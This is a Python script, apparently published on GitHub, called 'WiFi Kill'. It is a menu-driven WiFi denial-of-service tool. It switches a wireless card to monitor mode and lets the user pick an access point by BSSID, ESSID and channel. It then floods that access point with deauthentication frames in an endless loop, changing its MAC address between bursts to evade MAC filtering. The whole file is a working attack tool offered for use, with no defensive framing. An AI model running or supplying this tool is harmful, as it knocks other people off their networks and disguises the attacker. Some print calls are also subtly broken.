#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Developed in Python3
# RUN WITH ROOT USER!!!
# Install NETIFACES: 'pip3 install netifaces'
"""
+-------------------------------------------------------+
| Create BY: Julian Pedro F. Braga                      |
|                                                       |
| [*] AUTOR:        Julian Pedro F. Braga               |
| [*] GITHUB:       https://github.com/JulianPedro      |
+-------------------------------------------------------+
"""

import os
import time
import subprocess
import netifaces

CYAN = '\033[96m'
BLUE = '\033[94m'
GREEN = '\033[92m'
RED = '\033[91m'
BOLD = '\033[1m'
END = '\033[0m'
RESET='\033[1;00m'


def attack(monitor):
	os.system('airodump-ng {0} --manufacturer'.format(monitor))
	bssid = input(GREEN+BOLD+'DWD (attack) > Set BSSID: '+END)
	essid = input(GREEN+BOLD+'DWD (attack) > Set ESSID: '+END)
	channel = input(GREEN+BOLD+'DWD (attack) > Set CHANNEL: '+END)
	frames = input(RED+BOLD+'DWD (attack) > Set Number Of Frames Before Mac Reset [Ex: 1000]: '+END)
	start = input(GREEN+BOLD+'DWD (attack) > Start Attack [Y/N]: ')
	if (start.upper() == 'Y'):
		print(GREEN+BOLD+'DWD (attack) > Starting Attack in 3s! '+END)
		time.sleep(3)
		print(GREEN+BOLD+'DWD (attack) > Settling Channel {0}'+END).format(channel)
		os.system('airodump-ng --bssid '+bssid+' --channel '+channel+' '+monitor+' 2> /dev/null &')		
		while True:
			print(GREEN+BOLD+'DWD (attack) > Changing address MAC'+END)
			os.system('ifconfig '+monitor+' down')
			m = os.system('macchanger -r '+monitor+' 1> /dev/null 2> /dev/null')
			os.system('ifconfig '+monitor+' up')
			if m == 256:
				next = input(RED+BOLD+'DWD (attack) > Error in changing adress MAC! Continue [Y/N]: '+END)
				if (not(next.upper() == 'Y')):
					exit()			
			print(RED+BOLD+'DWD (attack) > Sending '+frames+' Deauth Frames in Channel '+channel+''+END)
			if (not essid):
				os.system('aireplay-ng -0 '+frames+' -a '+bssid+' --ignore-negative-one '+monitor+' > /dev/null')
			else:
				os.system('aireplay-ng -0 '+frames+' -a '+bssid+' -e '+essid+' --ignore-negative-one '+monitor+' > /dev/null')
			time.sleep(1)
	else:
		exit()

def mount_mode():
	card = input(GREEN+BOLD+'DWD (mount_monitor_mode) > Input WiFi Card Name: '+END)
	os.system('airmon-ng check kill > /dev/null')
	start_monitor = 'airmon-ng start {0} > /dev/null'.format(card)
	os.system(start_monitor)
	faces = netifaces.interfaces()
	for i in faces:
		f = len(i)
		f -= 3
		if (i[f:] == 'mon' or i[:3] == 'mon'):
			monitor = str(i)
			print(RED+BOLD+'DWD (mount_monitor_mode) > Monitor Mode Enable [{0}]'+END).format(monitor)
			print(GREEN+BOLD+'DWD (mount_monitor_mode) > Redirecting Run Attack'+END)
			print(RED+BOLD+'DWD (attack) > Press Ctrl+C To Select The Network'+END)
			time.sleep(5)
			attack(monitor)
			return monitor

def set_mode():
	monset = input(GREEN+BOLD+'DWD (set_monitor_mode) > Input Monitor Mode Name: '+END)
	print(GREEN+BOLD+'DWD (mount_monitor_mode) > Redirecting Run Attack'+END)
	print(RED+BOLD+'DWD (attack) > Press Ctrl+C To Select The Network'+END)
	monitor = monset
	time.sleep(5)
	attack(monitor)
	return monitor

banner = '''\033[96m \033[1m
██╗    ██╗ ██╗███████╗██╗    ██╗  ██╗██╗██╗     ██╗         
██║    ██║ ██║██╔════╝██║    ██║ ██╔╝██║██║     ██║         
██║ █╗ ██║ ██║█████╗  ██║    █████╔╝ ██║██║     ██║         
██║███╗██║ ██║██╔══╝  ██║    ██╔═██╗ ██║██║     ██║         
╚███╔███╔╝ ██║██║     ██║    ██║  ██╗██║███████╗███████╗    
 ╚══╝╚══╝  ╚═╝╚═╝     ╚═╝    ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝\033[0m '''
os.system('clear')
print(banner)
time.sleep(1.5)
print('''\033[92m\033[1m
Deauth WiFi DoS With MAC Bypass - WiFi Kill - By: Julian Pedro F. Braga

[1] - Mount Monitor Mode
[2] - Set Monitor Mode
[0] - Exit
\033[0m''')
option = int(input(GREEN+BOLD+'DWD (option) > '+END))
if option == 1:
	mount_mode()
elif option == 2:
	set_mode()
elif option == 0:
	print(RED+BOLD+'Bye..\n'+END)
	exit()
else:
	print(RED+BOLD+'Value Incorret!\n'+END)
	exit()